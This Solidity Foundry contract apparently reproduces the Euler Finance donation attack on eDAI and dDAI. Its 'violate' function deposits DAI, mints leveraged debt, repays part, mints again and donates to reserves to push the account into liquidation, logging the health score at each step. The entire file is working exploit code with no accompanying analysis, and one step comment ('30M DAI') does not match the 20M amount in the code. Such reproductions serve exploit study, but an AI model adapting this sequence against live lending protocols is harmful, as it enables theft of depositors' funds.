// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { IMarkets } from "./interface/IMarkets.sol";
import { IRiskManager } from "euler-contracts/contracts/IRiskManager.sol";

import "forge-std/src/Test.sol";

contract Violator {
    IERC20 immutable DAI;
    IEToken immutable eDAI;
    IDToken immutable dDAI;
    address immutable EULER;
    IMarkets immutable MARKETS;
    ILiquidation immutable LIQUIDATION;
    address person;
    IRiskManager immutable RISK_MANAGER;

    event log_named_decimal_uint (string key, uint val, uint decimals);

    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler, ILiquidation _liquidation, IMarkets _markets, address _person) {
        DAI = _dai;
        eDAI = _eDAI;
        dDAI = _dDAI;
        EULER = _euler;
        MARKETS = _markets;
        LIQUIDATION = _liquidation;
        person = _person;
    }

    function violate() external {
        //IRiskManager.LiquidityStatus memory status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after depositing", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after depositing", status.liabilityValue, 18);

        // for safeTransferFrom in deposit
        DAI.approve(EULER, type(uint256).max);
        
        // 3. Deposit 30M DAI 
        eDAI.deposit(0, 20_000_000 * 1e18);
        MARKETS.getUserAsset("After depositing (violator): ", address(eDAI), address(this));
        console.log(" ");

        // 4. Borrow (mint) 10 x deposit
        eDAI.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("After minting (violator): ", address(eDAI), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        console.log(" ");

        // 5. Repay 10M DAI
        dDAI.repay(0, 10_000_000 * 1e18);
        MARKETS.getUserAsset("After repaying (violator): ", address(eDAI), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        console.log(" ");

        // 6. Mint 10 x deposit again
        eDAI.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("After minting (violator): ", address(eDAI), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        console.log(" ");
        
        // 7. Donate 100M DAI
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
        MARKETS.getUserAsset("After donating (violator): ", address(eDAI), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        console.log(" ");
    }
}